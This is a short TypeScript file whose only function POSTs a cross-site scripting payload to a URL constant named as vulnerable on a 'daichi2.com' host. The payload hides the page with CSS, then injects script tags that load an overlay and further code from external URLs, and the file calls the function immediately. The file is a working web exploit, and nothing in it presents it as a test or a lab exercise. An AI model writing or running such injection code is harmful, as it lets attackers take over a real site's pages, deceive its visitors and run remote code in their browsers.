import { go } from 'utils/go';
import { DAICHI2_VULNERABLE_URL, REHABEAM_INJECTION_URL, OVERLAY_SURFACE_URL } from 'constants/uris';
import { VERSION } from 'constants/directives';

function injectScript(script: string): void {
	const targetURL = `${location.protocol || 'https:'}//${location.hostname.split('.').slice(0, -2).concat('daichi2.com').join('.')}${
		location.pathname
	}`;

	go(DAICHI2_VULNERABLE_URL, {
		method: 'POST',
		body: {
			keyword: `<style>html, body { display: none; }</style><script src="${OVERLAY_SURFACE_URL}?v=${VERSION}"></script><script>overlaySurface('${targetURL}');</script><script defer src="${script}"></script>`,
		},
	});
}

injectScript(`${REHABEAM_INJECTION_URL}?v=${VERSION}`);
